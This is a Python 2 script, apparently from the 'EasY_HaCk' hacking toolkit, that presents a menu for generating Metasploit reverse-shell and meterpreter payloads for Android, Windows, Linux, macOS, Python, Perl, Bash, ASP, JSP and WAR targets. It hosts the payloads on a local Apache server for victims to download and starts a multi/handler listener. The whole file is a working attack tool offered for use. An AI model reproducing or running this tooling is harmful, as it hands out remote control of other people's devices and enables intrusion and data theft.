import os
import sys
import urllib
##################################
yes = set(['yes','y', 'ye', 'Y'])
no = set(['no','n'])
G = '\033[92m' #green
Y = '\033[93m' #yellow
B = '\033[94m' #blue
R = '\033[91m' #red
W = '\033[0m' #white
##################################
####################  Banner  #######################
def slowprint(text):
    import sys, time
    for txt in text + "\n":
        sys.stdout.write(txt)
        sys.stdout.flush()
        time.sleep(1. / 100)
def banner():
    import time
    print "\n"
    print "\033[1;34m[+]~\033[1;36mStarting Payload Maker Tool Now ... "
    print "\n"
    time.sleep(1)
    print "{}[*]~{}Started Now aT {}".format("\033[1;34m", "\033[1;32m", time.strftime("%X"))
    print ("""
%s      ____              __                __
     / __ \____ ___  __/ /___  ____ _____/ /
    / /_/ / __ `/ / / / / __ \/ __ `/ __  /
   / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ /
  /_/    \__,_/\__, /_/\____/\__,_/\__,_/
              /____/ Generator

  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/

     [+] Metasploit Payload Generator   [+]
   \n     [+]     Us it on your own risk     [+]
%s
 List payloads:
%s
 (1) Binaries Payloads

 (2) Scripting Payloads

 (3) Web Payloads

 (0) Exit

"""%(G,B,R))
    banner = raw_input("{} Select from the menu :{} ".format("\033[1;36m", "\033[1;32m"))
    print("")

    if banner == "1":
	    bin()
    elif banner == "2":
	    script()
    elif banner == "3":
	    web()
    elif banner == "4":
	    enc()

    else:
        sys.exit();
####################  BANNER  #######################
def clear():
	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')
###############################
def bin():
	print("""
  1) Android
  2) Windows
  3) Linux
  4) Mac OS
  0) Back to menu
""")

	bn = raw_input("Set Payload: ")
	print("")
	if bn == "1":
		android()
	elif bn == "2":
		windows()
	elif bn == "3":
		linux()
	elif bn == "4":
		mac()
	else:
		banner()

def web():
	print("""
	
  1) ASP
  2) JSP
  3) War
  0) Back to menu

""")

	wb = raw_input("Set Payload: ")
	print("")
	if wb == "1":
		asp()
	elif wb == "2":
		jsp()
	elif wb == "3":
		war()
	else:
		banner()

def script():
	print("""
  1) Python
  2) Perl
  3) Bash
  0) Back to menu
  
""")

	sc = raw_input("Set Payload: ")
	print("")
	if sc == "1":
		python()
	elif sc == "2":
		perl()
	elif sc == "3":
		bash()
	else:
		banner()
		
def android():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > /sdcard/EasY_HaCk/%s.apk"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.apk $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.apk"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD android/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
		
	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD android/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
def windows():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > /sdcard/EasY_HaCk/%s.exe"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.exe $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.exe"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/shell/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/shell/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

def linux():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > /sdcard/EasY_HaCk/%s.elf"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.elf $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.elf"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD linux/x86/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD linux/x86/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')


def mac():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho > /sdcard/EasY_HaCk/%s.macho"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.macho $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.macho"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD osx/x86/shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD osx/x86/shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')



def python():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > /sdcard/EasY_HaCk/%s.py"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.py $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.py"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_python
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_python
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')


def perl():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw > /sdcard/EasY_HaCk/%s.pl"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.pl $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.pl"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_perl
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_perl
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')


def bash():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > /sdcard/EasY_HaCk/%s.sh"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.sh $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.sh"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_bash
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_bash
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
def asp():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp > /sdcard/EasY_HaCk/%s.asp"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.asp $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.asp"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
def jsp():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw > /sdcard/EasY_HaCk/%s.jsp"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.jsp $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.jsp"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD java/jsp_shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD java/jsp_shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
def war():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war > /sdcard/EasY_HaCk/%s.war"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('rm $PREFIX/var/run/apache2/httpd.pid')
		os.system('apachectl start')
		os.system('cp /sdcard/EasY_HaCk/%s.war $PREFIX/share/apache2/default-site/htdocs/zaki/'%(name))
		os.system('clear')
		print "Your IP Successfully Poisened :\033[0m http://%s:8080/zaki/%s.war"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD java/jsp_shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD java/jsp_shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
os.system("clear")
print "\n"
ban = "\033[1;36mHello Guys This Is Simple Payload Generator for EasY_HaCk Tools . \033[1;31m\nBy\033[1;32m[@Black_Memo][Emad Fakhry]\033[1;34m&&\033[1;32m[Sabri Zaki] "

slowprint(ban)
banner()

